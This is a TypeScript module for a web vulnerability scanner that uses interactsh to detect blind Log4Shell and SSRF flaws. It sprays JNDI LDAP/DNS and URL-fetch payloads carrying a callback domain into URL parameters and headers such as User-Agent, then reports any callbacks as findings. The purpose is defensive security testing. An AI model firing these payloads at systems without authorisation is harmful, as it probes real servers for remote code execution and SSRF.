/**
 * OOB collaborator wrapper — drives `interactsh-client` from ProjectDiscovery.
 *
 * What it does:
 *   1. Spawns `interactsh-client` in non-interactive JSON mode, capturing
 *      a per-scan canary subdomain like `xyz.interact.sh`.
 *   2. For each high-interest URL parameter, sends a payload containing the
 *      canary in a way that hits common blind-RCE / blind-SSRF sinks:
 *         - `${jndi:ldap://CANARY/x}`         (Log4Shell-class)
 *         - `${jndi:dns://CANARY/x}`           (Log4Shell DNS-only)
 *         - `<url>?next=http://CANARY/`        (SSRF candidate)
 *         - User-Agent / Referer / X-Forwarded-Host with CANARY
 *   3. Polls the interactsh-client output stream for callbacks and emits a
 *      finding the moment one arrives.
 *
 * Why this is the missing piece for Tier-1 detection: blind RCE / blind SSRF
 * never echo back synchronously, so we miss them with reflection-based probes.
 * An OOB oracle (DNS / HTTP callback) confirms exploitability when the target
 * actually fetches the canary.
 *
 * Requires `interactsh-client` on PATH. If absent, scanner skips gracefully.
 */

import { draft, type Scanner } from "../../engine/scanner";
import { detectCli, runCli, safeUrl, truncate } from "../common";
import { loadSiteMap } from "../../web/sitemap";
import { BrowsingSession } from "../../web/session";

interface InteractshHit {
  protocol?: string;
  full_id?: string;
  unique_id?: string;
  raw_request?: string;
  remote_address?: string;
  timestamp?: string;
}

export const oobInteractshScanner: Scanner = {
  id: "web.oob-interactsh",
  name: "Out-of-Band Collaborator (interactsh)",
  kind: "web",
  description: "Spawns interactsh-client to obtain a unique callback domain, fires JNDI / SSRF / Log4Shell-shaped payloads carrying that domain into headers + URL params, then polls for DNS / HTTP callbacks. Confirms blind RCE / SSRF / XXE that synchronous probes miss.",
  defaultEnabled: false,
  async tool() {
    const v = await detectCli("interactsh-client", "-version");
    return {
      id: "web.oob-interactsh", name: "OOB Collaborator", kind: "web",
      backend: "cli", cliCommand: "interactsh-client", cliVersionArg: "-version",
      status: v ? "available" : "missing", detectedVersion: v ?? undefined,
      installHint: "`go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`",
      upstream: "https://github.com/projectdiscovery/interactsh",
      license: "MIT",
      description: "Out-of-band callback service for blind-vuln confirmation.",
    };
  },
  async run(ctx) {
    const seed = safeUrl(ctx.target.value); if (!seed) return;
    const v = await detectCli("interactsh-client", "-version");
    if (!v) { await ctx.log("warn", "interactsh-client not found"); return; }
    const map = await loadSiteMap(ctx.scanId);
    const session = new BrowsingSession(seed.origin, ctx.target.auth?.headers ?? {});

    // Collect parameters to fuzz — same shape as active-injection.
    const targets: { url: URL; param: string }[] = [];
    if (map) {
      for (const p of map.pages) {
        const u = safeUrl(p.url); if (!u) continue;
        for (const k of u.searchParams.keys()) targets.push({ url: u, param: k });
      }
    }
    if (!targets.length) targets.push({ url: seed, param: "x" });

    // Track injected payloads → originating target so we can attribute callbacks.
    const inFlight: { id: string; canary: string; url: string; param: string; method: string }[] = [];

    // Run interactsh-client; pipe JSON output line-by-line.
    const probeMap = new Map<string, { url: string; param: string; method: string }>();
    const cli = runCli("interactsh-client", ["-json", "-poll-interval", "5", "-no-color"], {
      signal: ctx.signal,
      timeoutMs: 5 * 60 * 1000,
      onStdout: async (line) => {
        const trimmed = line.trim();
        // First few lines: greeting + the assigned domain. Capture domain.
        const domainMatch = /\b([a-z0-9]{20,32}\.[a-z0-9.-]+\.(?:oast\.\w+|interact\.sh))\b/.exec(trimmed);
        if (domainMatch && !probeMap.size) {
          const domain = domainMatch[1];
          await ctx.log("info", `interactsh domain: ${domain}`);
          await fireProbes(domain);
        }
        if (!trimmed.startsWith("{")) return;
        let hit: InteractshHit;
        try { hit = JSON.parse(trimmed); } catch { return; }
        const id = hit.unique_id ?? hit.full_id ?? "";
        const orig = probeMap.get(id);
        if (!orig) return;
        await ctx.emit(draft({
          severity: "critical", confidence: "high",
          title: `Blind ${hit.protocol?.toUpperCase() ?? "OOB"} hit on ${orig.method}-injection at ${orig.param} (${orig.url})`,
          description: `Server reached out to our interactsh canary via ${hit.protocol} — confirmed ${orig.method === "header" ? "Log4Shell-class injection" : "SSRF / blind RCE"}.`,
          ruleId: `oob/${hit.protocol ?? "callback"}`,
          cwe: ["CWE-918", "CWE-502"], owasp: ["A10:2021"],
          location: { url: orig.url, snippet: orig.param },
          evidence: { protocol: hit.protocol, remote: hit.remote_address, request: truncate(hit.raw_request ?? "", 400) },
          remediation: "Patch the underlying sink. For Log4Shell, upgrade Log4j to ≥ 2.17.1. For SSRF, validate URLs against an allow-list and block egress to internal ranges.",
          references: ["https://github.com/projectdiscovery/interactsh"],
        }));
      },
    });

    async function fireProbes(domain: string) {
      const PAYLOADS = (id: string) => [
        { kind: "jndi-ldap", value: `\${jndi:ldap://${id}.${domain}/x}` },
        { kind: "jndi-dns",  value: `\${jndi:dns://${id}.${domain}/x}` },
        { kind: "url-fetch", value: `http://${id}.${domain}/` },
      ];
      const HEADERS = ["User-Agent", "Referer", "X-Forwarded-Host", "X-Api-Version"];
      let counter = 0;
      for (const t of targets.slice(0, 50)) {
        for (const p of PAYLOADS(`p${counter++}`)) {
          const id = /([a-z0-9]+)\.[a-z0-9.-]+/.exec(p.value.replace(/.*?:\/\//, ""))?.[1] ?? "";
          probeMap.set(id, { url: t.url.toString(), param: t.param, method: p.kind });
          // 1) URL parameter probe
          const probeUrl = new URL(t.url.toString());
          probeUrl.searchParams.set(t.param, p.value);
          try { await session.fetch(probeUrl.toString(), { signal: ctx.signal }); } catch { /* tolerate */ }
        }
        // 2) Header injection on the seed page once.
        for (const h of HEADERS) {
          const id = `h${counter++}`;
          probeMap.set(id, { url: t.url.toString(), param: h, method: "header" });
          try { await session.fetch(t.url.toString(), { headers: { [h]: `\${jndi:ldap://${id}.${domain}/x}` }, signal: ctx.signal }); } catch { /* tolerate */ }
        }
      }
    }

    // Wait up to the timeout for callbacks; runCli resolves when the process exits.
    await cli;
    await ctx.progress(1, "interactsh done");
  },
};
